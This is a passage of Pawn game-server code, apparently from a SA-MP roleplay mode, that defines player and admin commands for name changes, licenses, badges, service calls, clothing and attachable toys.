			ShowPlayerDialogEx(giveplayerid, DIALOG_NAMECHANGE2, DIALOG_STYLE_INPUT, "Free name change","This is a roleplay server where you must have a name in this format: Firstname_Lastname.\nFor example: John_Smith or Jimmy_Johnson\n\nAn admin has offered you to change your name to the correct format for free. Please enter your desired name below.\n\nNote: If you press cancel you will be kicked from the server.", "Change", "Cancel");

			format(string, sizeof(string), "You have forced %s to change their name.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);

			SetPVarInt(giveplayerid, "requestpath", 1);

			if(strlen(PlayerInfo[giveplayerid][pFlag]) == 0)
            	AddFlag(giveplayerid, playerid, "Non-RP name, needs to be changed");
		}
	}

	return 1;
}

CMD:nchange(playerid, params[])
	return cmd_namechanges(playerid, params);

CMD:namechanges(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
 	{
		new
			nstring[64 + (MAX_PLAYER_NAME * 2)],
			newname[MAX_PLAYER_NAME];

  		SendClientMessage(playerid, COLOR_GREEN, "* Pending name changes:");
   		foreach(Player, i)
		{
			if(GetPVarType(i, "RequestingNameChange"))
			{
  				GetPVarString(i, "NewNameRequest", newname, MAX_PLAYER_NAME);
				format(nstring, sizeof(nstring), "Current name: %s (ID: %d) | Requested name: %s | Price: %d", GetPlayerNameEx(i), i, newname, GetPVarInt(i, "NameChangeCost"));
				SendClientMessage(playerid, COLOR_YELLOW, nstring);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "_____________________________________________________");
	}
	return 1;
}

CMD:approvename(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You're not authorised to use this command.");

	new
	    iTarget,
		szQuery[128];

	if(sscanf(params, "u", iTarget))
	    return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /approvename [playerid/partOfName]");

	if(iTarget == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

    if(GetPVarInt(iTarget, "RequestingNameChange") == 0)
		return SendClientMessage(playerid, COLOR_GREY, "The specified player isn't requesting a name change.");

	new
	    szPlayerName[MAX_PLAYER_NAME];

    GetPVarString(iTarget, "NewNameRequest", szPlayerName, MAX_PLAYER_NAME);
    SetPVarInt(iTarget, "requestby", playerid);

    mysql_escape_string(szPlayerName, szPlayerName,MAX_PLAYER_NAME,sqldb);

    SetPVarString(iTarget, "requestedname", szPlayerName);

    mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT Username FROM players WHERE Username = '%s'", szPlayerName);
	mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_CHECK_NEW_NAME,iTarget);
	return 1;
}

CMD:denyname(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /denyname [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			if(GetPVarInt(giveplayerid, "RequestingNameChange") == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player isn't requesting a namechange!");
				return 1;
			}

			SendClientMessage(giveplayerid,COLOR_YELLOW," Your name change request has been denied.");
			format(string, sizeof(string), "%s has denied %s's name change request",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
			ABroadCast(COLOR_YELLOW, string, 1);
			DeletePVar(giveplayerid, "RequestingNameChange");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to use this command.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "No such player.");
	}
	return 1;
}

CMD:window(playerid, params[])
{
	new string[128];
    if(InsideShamal[playerid] != INVALID_VEHICLE_ID)
	{
        if(GetPlayerInterior(playerid) == 1)
		{
            new
                Float: fSpecPos[6];

            GetPlayerPos(playerid, fSpecPos[0], fSpecPos[1], fSpecPos[2]);
            GetPlayerFacingAngle(playerid, fSpecPos[3]);
            GetPlayerHealth(playerid, fSpecPos[4]);
            GetPlayerArmour(playerid, fSpecPos[5]);

            SetPVarFloat(playerid, "air_Xpos", fSpecPos[0]);
            SetPVarFloat(playerid, "air_Ypos", fSpecPos[1]);
            SetPVarFloat(playerid, "air_Zpos", fSpecPos[2]);
            SetPVarFloat(playerid, "air_Rpos", fSpecPos[3]);
            SetPVarFloat(playerid, "air_HP", fSpecPos[4]);
            SetPVarFloat(playerid, "air_Arm", fSpecPos[5]);

            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            TogglePlayerSpectating(playerid, 1);
            PlayerSpectateVehicle(playerid, InsideShamal[playerid]);

            format(string, sizeof(string), "* %s glances out the window.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
        }
        else TogglePlayerSpectating(playerid, 0);
    }
    return 1;
}

CMD:calculate(playerid, params[])
{
	new string[128], method[20], value1, value2;
	if(sscanf(params, "ds[20]d", value1, method, value2))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /calculate [value] [operation] [value].");
		SendClientMessage(playerid, COLOR_GRAD2, "Operations: Add, Subtract, Multiply, Divide.");
		return 1;
	}

	if(strcmp(method,"multiply",true) == 0 || strcmp(method,"*",true) == 0)
	{
		new sum = value1*value2;
		format(string,sizeof(string),"%d multiplied by %d equals %d.",value1,value2,sum);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	if(strcmp(method,"divide",true) == 0 || strcmp(method,"/",true) == 0)
	{
		if(value2 == 0)
			return GameTextForPlayer(playerid, "face~r~palm", 1000, 3);

		new sum = value1/value2;
		format(string,sizeof(string),"%d divided by %d equals %d.",value1,value2,sum);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	if(strcmp(method,"add",true) == 0 || strcmp(method,"+",true) == 0)
	{
		new sum = value1+value2;
		format(string,sizeof(string),"%d added to %d equals %d.",value1,value2,sum);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	if(strcmp(method,"subtract",true) == 0 || strcmp(method,"-",true) == 0)
	{
		new sum = value1-value2;
		format(string,sizeof(string),"%d subtracted by %d equals %d.",value1,value2,sum);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	return 1;
}

CMD:kills(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /kills [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
			format(string, sizeof(string), "<< Last 10 Kills of %s >>", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_YELLOW, string);

			if(!isnull(PlayerInfo[giveplayerid][pKillLog9]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog9]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog8]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog8]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog7]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog7]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog6]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog6]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog5]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog5]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog4]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog4]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog3]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog3]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog2]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog2]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog1]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog1]);
			if(!isnull(PlayerInfo[giveplayerid][pKillLog0]))
				SendClientMessage(playerid, COLOR_YELLOW, PlayerInfo[giveplayerid][pKillLog0]);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:clothes(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 9) {
        return ShowPlayerDialogEx(playerid, DIALOG_SAN_CLOTHES, DIALOG_STYLE_LIST, "Faction clothes", "Male Reporter (ID: 113)\nFemale Reporter (ID: 148)", "OK", "Cancel");
	}
	else if(PlayerInfo[playerid][pGang] != 255) {
		if(IsAtClothShop(playerid)) {
			new string[128];
			new PG = PlayerInfo[playerid][pGang];

			if(FamilyInfo[PG][FamilyMaxSkins] == 0)
			{
            	SendClientMessage(playerid, COLOR_WHITE, "Your family skins have not been set by an admin yet.");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 1)
			{
  				format(string,sizeof(string),"Skin 1: %d", FamilyInfo[PG][FamilySkins][0]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Family skin selection",string,"Select","Cancel");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 2)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Family skin selection",string,"Select","Cancel");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 3)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Family skin selection",string,"Select","Cancel");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 4)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Family skin selection",string,"Select","Cancel");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 5)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d\nSkin 5: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3], FamilyInfo[PG][FamilySkins][4]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Family skin selection",string,"Select","Cancel");
			}
   			if(FamilyInfo[PG][FamilyMaxSkins] == 6)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d\nSkin 5: ID %d\nSkin 6: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3], FamilyInfo[PG][FamilySkins][4], FamilyInfo[PG][FamilySkins][5]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Family skin selection",string,"Select","Cancel");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 7)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d\nSkin 5: ID %d\nSkin 6: ID %d\nSkin 7: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3], FamilyInfo[PG][FamilySkins][4], FamilyInfo[PG][FamilySkins][5], FamilyInfo[PG][FamilySkins][6]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Family skin selection",string,"Select","Cancel");
			}
			if(FamilyInfo[PG][FamilyMaxSkins] == 8)
			{
				format(string,sizeof(string),"Skin 1: ID %d\nSkin 2: ID %d\nSkin 3: ID %d\nSkin 4: ID %d\nSkin 5: ID %d\nSkin 6: ID %d\nSkin 7: ID %d\nSkin 8: ID %d", FamilyInfo[PG][FamilySkins][0], FamilyInfo[PG][FamilySkins][1], FamilyInfo[PG][FamilySkins][2], FamilyInfo[PG][FamilySkins][3], FamilyInfo[PG][FamilySkins][4], FamilyInfo[PG][FamilySkins][5], FamilyInfo[PG][FamilySkins][6], FamilyInfo[PG][FamilySkins][7]);
				ShowPlayerDialogEx(playerid,FAMILYSKINDIALOG,DIALOG_STYLE_LIST,"Family skin selection",string,"Select","Cancel");
			}
			return 1;
		}
		else {
			SendClientMessage(playerid, COLOR_GRAD2, "   You're not in a Clothing Shop!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid,COLOR_GREY, "   You're not in a Family, use /buyclothes instead!");
	}
	return 1;
}

CMD:licenses(playerid, params[])
{
	new string[128], text1[20], text2[20], text4[20];
	if(PlayerInfo[playerid][pCarLic]) { text1 = "Acquired"; } else { text1 = "Not acquired"; }
	if(PlayerInfo[playerid][pFlyLic]) { text4 = "Acquired"; } else { text4 = "Not acquired"; }
	if(PlayerInfo[playerid][pBoatLic]) { text2 = "Acquired"; } else { text2 = "Not acquired"; }
	SendClientMessage(playerid, COLOR_WHITE, "Your licenses...");
	format(string, sizeof(string), "** Driver's license: %s.", text1);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** Pilot license: %s.", text4);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** Boating license: %s.", text2);
	SendClientMessage(playerid, COLOR_GREY, string);
	return 1;
}

CMD:showlicenses(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /showlicenses [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't show licenses to yourself - use /licenses for that."); return 1; }
			new text1[20], text2[20], text4[20];
			if(PlayerInfo[playerid][pCarLic]) { text1 = "Acquired"; } else { text1 = "Not acquired"; }
			if(PlayerInfo[playerid][pFlyLic]) { text4 = "Acquired"; } else { text4 = "Not acquired"; }
			if(PlayerInfo[playerid][pBoatLic]) { text2 = "Acquired"; } else { text2 = "Not acquired"; }
			format(string, sizeof(string), "Listing %s's licenses...", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_WHITE, string);
			format(string, sizeof(string), "** Driver's license: %s.", text1);
			SendClientMessage(giveplayerid, COLOR_GREY, string);
			format(string, sizeof(string), "** Pilot license: %s.", text4);
			SendClientMessage(giveplayerid, COLOR_GREY, string);
			format(string, sizeof(string), "** Boating license: %s.", text2);
			SendClientMessage(giveplayerid, COLOR_GREY, string);
			format(string, sizeof(string), "* %s has shown their licenses to you.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* You have shown your licenses to %s.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* %s has shown their licenses to %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			return 1;
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		return 1;
	}
	return 1;
}

CMD:showbadge(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] >= 1 || PlayerInfo[playerid][pLeader] >= 1) {
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /showbadge [playerid/partofname]");

		if(giveplayerid != INVALID_PLAYER_ID) {
			if(ProxDetectorS(5.0, playerid, giveplayerid)) {
				switch(PlayerInfo[playerid][pFaction]) {
					case 1, 2, 3, 5: {
						new
							infoArrays[3][64];

						GetPlayerFactionInfo(playerid, infoArrays[0], infoArrays[1], infoArrays[2]);

						SendClientMessage(giveplayerid, COLOR_GRAD2, "----------------------------------------------------------------------------------------------------");
						format(string, sizeof(string), "%s %s is a duly sworn member of the %s (%s).", infoArrays[0], GetPlayerNameEx(playerid), infoArrays[2], infoArrays[1]);
						SendClientMessage(giveplayerid, COLOR_WHITE, string);
						format(string, sizeof(string), "Current Assignment: %s.", infoArrays[1]);
						SendClientMessage(giveplayerid, COLOR_WHITE, string);

						switch(PlayerInfo[playerid][pFaction]) {
							case 1: SendClientMessage(giveplayerid, COLOR_WHITE, "Under the Authority of the City of Los Santos.");
							case 2, 5: SendClientMessage(giveplayerid, COLOR_WHITE, "Under the Authority of the United States Government.");
							default: SendClientMessage(giveplayerid, COLOR_WHITE, "Under the Authority of the State of San Andreas.");
						}

						if(PlayerInfo[playerid][pFaction] != 3) SendClientMessage(giveplayerid, COLOR_WHITE, "Official has the authority to arrest.");
						if(PlayerInfo[playerid][pFaction] == 3) SendClientMessage(giveplayerid, COLOR_WHITE, "Official has the authority to assist in arrest.");
						SendClientMessage(giveplayerid, COLOR_GRAD2, "----------------------------------------------------------------------------------------------------");
						format(string, sizeof(string), "* %s shows their badge to %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
					default: SendClientMessage(playerid, COLOR_WHITE, "You're not in a civil service faction.");
				}
			}
			else SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
		}
		else SendClientMessage(playerid, COLOR_WHITE, "You're not in a civil service faction.");
	}
	return 1;
}

CMD:service(playerid, params[])
{
	new string[128], choice[32];
	if(sscanf(params, "s[32]", choice))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /service [name]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Taxi, Bus, Medic, Mechanic, EMS");
		return 1;
	}

	if(PlayerInfo[playerid][pJailed] > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You can't use this in jail/prison.");
		return 1;
	}
	if(ServiceTime[playerid] > 0) return SendClientMessage(playerid, COLOR_WHITE, "You must wait 30 seconds before using this command again. ");

	if(strcmp(choice,"ems",true) == 0)
	{
		if(GetPVarInt(playerid, "Injured") == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   You're not injured, you can't call for EMS now!");
			return 1;
		}
		new zone[MAX_ZONE_NAME];
		GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
		SetPVarInt(playerid, "EMSAttempt", 1);
		SendClientMessage(playerid, COLOR_WHITE, "The EMS have been informed of your current location and are on their way.");
		format(string, sizeof(string), "Emergency Dispatch has reported (%d) %s to be wounded at %s, They require immediate emergency transport.",playerid, GetPlayerNameEx(playerid), zone);
		SendRadioMessage(3, TEAM_MED_COLOR, string);
		ServiceTime[playerid] = 30;
		return 1;
	}
	else if(strcmp(choice,"taxi",true) == 0)
	{
		if(TaxiDrivers < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   There are no taxi drivers on duty at the moment, try again later!");
			return 1;
		}
		if(TransportDuty[playerid] > 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   You can't call for a taxi now!");
			return 1;
		}

		new
			szZoneName[MAX_ZONE_NAME];

		GetPlayer2DZone(playerid, szZoneName, MAX_ZONE_NAME);
		format(string, sizeof(string), "** %s is in need of a taxi driver at %s - use /accept taxi to accept the call.", GetPlayerNameEx(playerid), szZoneName);
		SendTaxiMessage(TEAM_AZTECAS_COLOR, string);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have called for a taxi driver, wait for a reply.");
		TaxiCall = playerid;
		ServiceTime[playerid] = 30;
		return 1;
	}
	else if(strcmp(choice,"bus",true) == 0)
	{
		if(BusDrivers < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   There are no bus drivers at the moment, try again later!");
			return 1;
		}
		if(TransportDuty[playerid] > 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   You can't call for a bus now!");
			return 1;
		}
		format(string, sizeof(string), "** %s is in need of a bus driver - use /accept bus to accept the call.", GetPlayerNameEx(playerid));
		SendBusMessage(TEAM_AZTECAS_COLOR, string);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have called for a bus driver, wait for a reply.");
		BusCall = playerid;
		ServiceTime[playerid] = 30;
		return 1;
	}
	else if(strcmp(choice,"medic",true) == 0)
	{
		if(Medics < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   There are no medics on duty at the moment, try again later!");
			return 1;
		}
		format(string, sizeof(string), "** %s is in need of a Medic - use /accept medic to accept the call.", GetPlayerNameEx(playerid));
		SendRadioMessage(3, TEAM_AZTECAS_COLOR, string);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have called for a medic, wait for a reply.");
		MedicCall = playerid;
		ServiceTime[playerid] = 30;
		return 1;
	}
	else if(strcmp(choice,"mechanic",true) == 0)
	{
		if(Mechanics < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   There are no car mechanics on duty at the moment, try again later!");
			return 1;
		}
		format(string, sizeof(string), "** %s is in need of a car mechanic - use /accept mechanic to accept the call.", GetPlayerNameEx(playerid));
		SendJobMessage(7, TEAM_AZTECAS_COLOR, string);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have called for a car mechanic, wait for a reply.");
		MechanicCall = playerid;
		ServiceTime[playerid] = 30;
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Unknown service name!");
		return 1;
	}
}

CMD:toyhelp(playerid, params[])
{
	SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	SendClientMessage(playerid, COLOR_WHITE,"*** TOY HELP ***");
	SendClientMessage(playerid, COLOR_GRAD3,"To buy a toy, go to any clothing store and type {AA3333}/buytoys");
	SendClientMessage(playerid, COLOR_GRAD3,"To attach/dettach, edit, or delete a toy type {AA3333}/toys");
	SendClientMessage(playerid, COLOR_GRAD3,"To quickly attach all your toys, type {AA3333}/wat");
	SendClientMessage(playerid, COLOR_GRAD3,"To quickly detach all your toys, type {AA3333}/dat");
	return 1;
}

CMD:buytoys(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
		return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

	if(IsAtClothShop(playerid))
		ShowPlayerDialogEx(playerid, BUYTOYS, DIALOG_STYLE_MSGBOX, "Toy Store", "Welcome to the toy store! Here you can buy accessories to attach to your player.\n\nFirst, we will choose a slot to store the toy in.\n(Note: Non-VIP can only hold 5 toys, Bronze-Silver VIP can hold 6-8)","Continue", "Cancel");
	else
		SendClientMessage(playerid, COLOR_WHITE, "You're not in a Clothing Shop.");

	return 1;
}

CMD:listtoys(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_GREY, "USAGE: /listtoys [playerid/partofname]");
		}
		else if(IsPlayerConnected(iTargetID)) for(new iToyIter, szMessage[128]; iToyIter < MAX_PLAYER_ATTOBJECTS; ++iToyIter) {
			for(new LoopRapist; LoopRapist < sizeof(HoldingObjectsAll); ++LoopRapist) {
				if(HoldingObjectsAll[LoopRapist][holdingmodelid] == PlayerToyInfo[iTargetID][iToyIter][ptModelID]) {
					format(szMessage, sizeof(szMessage), "%s (slot %i, bone: %s)", HoldingObjectsAll[LoopRapist][holdingmodelname], iToyIter, HoldingBones[PlayerToyInfo[iTargetID][iToyIter][ptBone]]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
					break;
				}
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
	}
	return 1;
}

CMD:toys(playerid, params[]) {
	if(PlayerCuffed[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

	ShowPlayerDialogEx(playerid, TOYS, DIALOG_STYLE_LIST, "Toy Menu", "Attach/Dettach a Toy\nEdit a Toy\nDelete a Toy","Select", "Cancel");
	return 1;
}

CMD:wat(playerid, params[]) {
	if(PlayerCuffed[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

	SendClientMessage(playerid, COLOR_WHITE, "* Attached all toys.");

	if(PlayerInfo[playerid][pVip] <= 0)
	{
		for(new x;x<5;x++)
		{
			if(PlayerToyInfo[playerid][x][ptScaleX] == 0) {
				PlayerToyInfo[playerid][x][ptScaleX] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleY] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleZ] = 1.0;
			}
			if(PlayerToyInfo[playerid][x][ptModelID] != 0) SetPlayerAttachedObject(playerid, x, PlayerToyInfo[playerid][x][ptModelID], PlayerToyInfo[playerid][x][ptBone], PlayerToyInfo[playerid][x][ptPosX], PlayerToyInfo[playerid][x][ptPosY], PlayerToyInfo[playerid][x][ptPosZ], PlayerToyInfo[playerid][x][ptRotX], PlayerToyInfo[playerid][x][ptRotY], PlayerToyInfo[playerid][x][ptRotZ], PlayerToyInfo[playerid][x][ptScaleX], PlayerToyInfo[playerid][x][ptScaleY], PlayerToyInfo[playerid][x][ptScaleZ]);
		}
	}
	else if(PlayerInfo[playerid][pVip] == 1)
	{
		for(new x;x<6;x++)
		{
			if(PlayerToyInfo[playerid][x][ptScaleX] == 0) {
				PlayerToyInfo[playerid][x][ptScaleX] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleY] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleZ] = 1.0;
			}
			if(PlayerToyInfo[playerid][x][ptModelID] != 0) SetPlayerAttachedObject(playerid, x, PlayerToyInfo[playerid][x][ptModelID], PlayerToyInfo[playerid][x][ptBone], PlayerToyInfo[playerid][x][ptPosX], PlayerToyInfo[playerid][x][ptPosY], PlayerToyInfo[playerid][x][ptPosZ], PlayerToyInfo[playerid][x][ptRotX], PlayerToyInfo[playerid][x][ptRotY], PlayerToyInfo[playerid][x][ptRotZ], PlayerToyInfo[playerid][x][ptScaleX], PlayerToyInfo[playerid][x][ptScaleY], PlayerToyInfo[playerid][x][ptScaleZ]);
		}
	}
	else if(PlayerInfo[playerid][pVip] == 2)
	{
		for(new x;x<7;x++)
		{
			if(PlayerToyInfo[playerid][x][ptScaleX] == 0) {
				PlayerToyInfo[playerid][x][ptScaleX] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleY] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleZ] = 1.0;
			}
			if(PlayerToyInfo[playerid][x][ptModelID] != 0) SetPlayerAttachedObject(playerid, x, PlayerToyInfo[playerid][x][ptModelID], PlayerToyInfo[playerid][x][ptBone], PlayerToyInfo[playerid][x][ptPosX], PlayerToyInfo[playerid][x][ptPosY], PlayerToyInfo[playerid][x][ptPosZ], PlayerToyInfo[playerid][x][ptRotX], PlayerToyInfo[playerid][x][ptRotY], PlayerToyInfo[playerid][x][ptRotZ], PlayerToyInfo[playerid][x][ptScaleX], PlayerToyInfo[playerid][x][ptScaleY], PlayerToyInfo[playerid][x][ptScaleZ]);
		}
	}
	else if(PlayerInfo[playerid][pVip] >= 3)
	{
		for(new x;x<8;x++)
		{
			if(PlayerToyInfo[playerid][x][ptScaleX] == 0) {
				PlayerToyInfo[playerid][x][ptScaleX] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleY] = 1.0;
				PlayerToyInfo[playerid][x][ptScaleZ] = 1.0;
			}
			if(PlayerToyInfo[playerid][x][ptModelID] != 0) SetPlayerAttachedObject(playerid, x, PlayerToyInfo[playerid][x][ptModelID], PlayerToyInfo[playerid][x][ptBone], PlayerToyInfo[playerid][x][ptPosX], PlayerToyInfo[playerid][x][ptPosY], PlayerToyInfo[playerid][x][ptPosZ], PlayerToyInfo[playerid][x][ptRotX], PlayerToyInfo[playerid][x][ptRotY], PlayerToyInfo[playerid][x][ptRotZ], PlayerToyInfo[playerid][x][ptScaleX], PlayerToyInfo[playerid][x][ptScaleY], PlayerToyInfo[playerid][x][ptScaleZ]);
		}
	}
	return 1;
}

CMD:dat(playerid, params[]) {
	if(PlayerCuffed[playerid] != 0)
